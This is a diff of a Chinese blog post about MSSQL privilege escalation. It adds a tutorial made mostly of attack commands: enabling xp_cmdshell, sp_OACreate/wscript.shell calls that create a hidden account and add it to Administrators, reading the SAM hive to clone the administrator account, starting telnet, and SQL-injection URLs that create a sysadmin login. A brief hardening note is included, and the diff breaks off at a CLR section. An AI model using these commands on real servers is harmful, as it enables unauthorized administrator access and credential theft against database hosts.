@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Mysql-提权 | Cupid&#39;s Blog</title>
+  <title itemprop="name">MsSql-提权 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -356,7 +356,7 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
           <header class="entry-header">
-            <h1 class="entry-title">Mysql-提权</h1>
+            <h1 class="entry-title">MsSql-提权</h1>
             <p class="entry-census">&nbsp;·&nbsp;2020-9-22&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
             <hr>
@@ -365,7 +365,63 @@
         <div class="entry-content">
           <p>首先是sql注入需要判断出数据库类型为sql server</p>
 <p>sysobjects是mssql数据库特有的数据表，系统对象表，保存当前数据库的对象，</p>
-<p>下面是mssql无文件落地提权:</p>
+<h3><span id="1xp_cmdshell">1.xp_cmdshell</span></h3><p>存储过程:实质就是许多sql注入的集合，就是存储在sqlserver中预先定义好的sql语句集合</p>
+<p>而在其中有个危险的存储过程，叫做xp_cmdshell.</p>
+<p>为什么说它危险呢，因为它可以执行操作系统的任何指令。</p>
+<p>如果可以获取sa的管理员权限，就可以使用sa的管理权限直接执行扩展存储过程中的xp_cmdshell。并获取返回值。</p>
+<h3><span id="2利用xp_cmdshell">2.利用xp_cmdshell</span></h3><p>EXEC master.dbo.xp_cmdshell ‘ipconfig’</p>
+<p>开启版本:</p>
+<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。</p>
+<p>如果用户有管理员sa权限则可以用sp_configure重新启用它。</p>
+<h3><span id="3开启xp_cmdshell">3.开启xp_cmdshell</span></h3><pre><code>exec sp_configure &#39;show advanced options&#39;,1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h3><span id="4关闭xp_cmdshell">4.关闭xp_cmdshell</span></h3><pre><code>exec sp_configure &#39;show advanced options&#39;,1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,0;recongiure</code></pre><h3><span id="5另外的提权思路">5.另外的提权思路</span></h3><p>先介绍一些可以操作注册表的存储过程:</p>
+<pre><code class="mssql">
+xp_regaddmultistring
+
+xp_regdeletekey //删除键
+
+xp_regdeletevalue //删除值
+
+xp_regenumkeys
+
+xp_regenumvalues //返回多个值
+
+xp_regread //读取键值
+
+xp_regremovemultistring
+
+xp_regwrite //写入键值 
+
+控制服务的xp_servicecontrol等
+
+开启telnet服务
+
+execmaster..xp_servicecontrol &#39;start&#39;, &#39;tlntsvr&#39;</code></pre>
+<p>OLE相关存储过程添加账户</p>
+<pre><code class="mssql">sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop</code></pre>
+<p>使用注册账号存储过程提权思路:</p>
+<p>1.添加账号test</p>
+<pre><code class="mssql">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user 123 123 /add&#39;</code></pre>
+<p>其中cmd.exe需要根据具体操作系统来确定</p>
+<pre><code class="mssql">xp和2003系统：
+
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user 123$ 123/add&#39;
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add&#39;</code></pre>
+<p>2.将123账号添加到administrators超级管理组</p>
+<pre><code class="mssql">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,&#39;null&#39;,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators 123/add&#39;</code></pre>
+<p>3.xp_regread&amp;xp_regwrite克隆账号</p>
+<p>获取administrator账号的加密密码</p>
+<pre><code>xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SAM\SAM\Domains\Account\Users\000001F4&#39;,&#39;F&#39;</code></pre><p>安全防护</p>
+<p>针对MSSQL sa弱口令入侵情况，最方便的防护手段:</p>
+<pre><code>1.对于MSSQL无需对外提供服务器使，请将此服务器端口关闭
+2.对于必须对外提供MSSQL服务的主机，我们需要加强sa口令复杂度的设置，同时对于一般性的业务系统调用数据库情况，尽量不要使用sa这种高权限的数据库管理权限，改为使用普通账户调用。</code></pre><h3><span id="others">Others</span></h3><p>利用sp_addlogin添加sql用户，同样还要提升权限。</p>
+<p>再用查询分析器连接sql server，再利用xp_cmdshell打开telnet服务。</p>
+<p>最后登录。</p>
+<p>往sql server里面添加用户(密码为空):</p>
+<pre><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec dbo.sp_addlogin user;</code></pre><p>如果要设置密码:</p>
+<pre><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec dbo.password null,password,user;</code></pre><p>提权:</p>
+<pre><code>http://1.1.1.1/news/default.asp?cataid=98986;use master dbo.sp_addsrvrolemember user,sysadmin;</code></pre><p>下面是mssql无文件落地提权:</p>
 <pre><code class="sql">sp_configure &#39;clr enabled&#39;, 1
 
 GO
